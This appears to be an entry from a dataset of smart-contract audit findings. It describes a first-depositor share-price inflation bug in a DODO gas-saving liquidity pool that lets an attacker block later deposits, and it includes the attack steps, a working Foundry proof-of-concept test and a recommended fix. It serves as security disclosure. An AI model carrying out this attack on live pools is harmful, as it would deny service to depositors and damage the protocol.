# [M] Share Price Inflation by First LP-er, Enabling

## Summary
Severity: Medium
Contest weight: 0.7583
Dataset id: 20424
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The smart contract contains a critical vulnerability that allows a malicious actor to manipulate the share price during the initialization of the liquidity pool, potentially leading to a DOS attack on subsequent buyShares operations. The root cause of the vulnerability lies in the initialization process of the liquidity pool, specifically in the calculation of shares during the first deposit.
```solidity
// Findings are labeled with '<= FOUND'
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol
function buyShares(address to)
...
// case 1. initial supply
// The shares will be minted to user
shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) // <= FOUND
? DecimalMath.divFloor(quoteBalance, _I_)
: balance(base, quote)
// The target will be updated
_BASE_TARGET_ = uint112(shares);
...
}
```
If the pool is empty, the smart contract directly sets the share value based on the minimium value of the base token denominated value of the provided assets. This assumption can be manipulated by a malicious actor during the first deposit, leading to a situation where the LP pool token becomes extremely expensive.

Attack Scenario
The attacker exploits the vulnerability during the initialization of the liquidity pool:
1. The attacker mints 1001 shares during the first deposit.
2. Immediately, the attacker sells back 1000 shares, ensuring to keep 1 wei via the sellShares function.
3. The attacker then donates a large amount (1000e18) of base and quote tokens and invokes the sync() routine to pump the base and quote reserves to 1001 + 1000e18.
4. The protocol users proceed to execute the buyShares function with a balance less than attacker's spending * 1001. The transaction reverts due to the mintRatio being kept below 1001 wad and the computed shares less than 1001 (line 71), while it needs a value >= 1001 to mint shares successfully.
```solidity
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol
function buyShares(address to)
...
// case 2. normal case
uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);
uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);
uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio; // <= FOUND: mintRatio below 1001wad if input amount smaller than reserves * 1001
// The shares will be minted to user
shares = DecimalMath.mulFloor(totalSupply, mintRatio); // <= FOUND: the manipulated totalSupply of 1wei requires a mintRatio of greater than 1000 for a successful _mint()
...
}
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol
function _mint(address user, uint256 value) internal {
require(value > 1000, "MINT_AMOUNT_NOT_ENOUGH"); // <= FOUND: next buyShares with volume less than 1001 x attacker balance will revert here
...
}
```
5. The _mint() function fails with a "MINT_AMOUNT_NOT_ENOUGH" error, causing a denial-of-service condition for subsequent buyShares operations. The impact of this vulnerability is severe, as it allows an attacker to conduct DOS attacks on buyShares with a low attacking cost (retrievable for further attacks via sellShares). This significantly impairs the core functionality of the protocol, potentially preventing further LP operations and hindering the protocol's ability to attract Total Value Locked (TVL) for other trading operations such as sellBase, sellQuote and flashloan.

## Proof of Concept
Apply the POC to dodo-gassaving-pool/test/GPSTrader.t.sol and run with cd dodo-gassaving-pool && forge test --fork-url "https://rpc.flashbots.net" -vvv --mt test_mint1weiShares_DOSx1000DonationVolume to check the result.
```solidity
// File: dodo-gassaving-pool/test/GPSTrader.t.sol
function test_mint1weiShares_DOSx1000DonationVolume() public {
    GSP gspTest = new GSP();
    gspTest.init(
        MAINTAINER,
        address(mockBaseToken),
        address(mockQuoteToken),
        0,
        0,
        false
    );
    // Buy 1001 shares
    vm.startPrank(USER);
    mockBaseToken.transfer(address(gspTest), 1001);
    mockQuoteToken.transfer(address(gspTest), 1001 * gspTest._I_() / 1e18);
    gspTest.buyShares(USER);
    assertEq(gspTest.balanceOf(USER), 1001);
    // User sells shares and keep ONLY 1wei
    gspTest.sellShares(1000, USER, 0, 0, "", block.timestamp);
    assertEq(gspTest.balanceOf(USER), 1);
    // User donate a huge amount of base & quote tokens to inflate the share price
    uint256 donationAmount = 1000e18;
    mockBaseToken.transfer(address(gspTest), donationAmount);
    mockQuoteToken.transfer(address(gspTest), donationAmount * gspTest._I_() / 1e18);
    gspTest.sync();
    vm.stopPrank();
    // DOS subsequent operations with roughly 1001 x donation volume
    uint256 dosAmount = donationAmount * 1001;
    mockBaseToken.mint(OTHER, type(uint256).max);
    mockQuoteToken.mint(OTHER, type(uint256).max);
    vm.startPrank(OTHER);
    mockBaseToken.transfer(address(gspTest), dosAmount);
    mockQuoteToken.transfer(address(gspTest), dosAmount * gspTest._I_() / 1e18);
    vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
    gspTest.buyShares(OTHER);
    vm.stopPrank();
}
```
A PASS result would confirm that any deposits with volume less than 1001 times to attacker cost would fail. That means by spending $1000, the attacker can DOS any transaction with volume below $1001,000.

## Recommendation
initialization. A potential solution is inspired by Uniswap V2 Core Code, which sends the first 1001 LP tokens to the zero address. This way, it's extremely costly to inflate the share price as much as 1001 times on the first deposit.
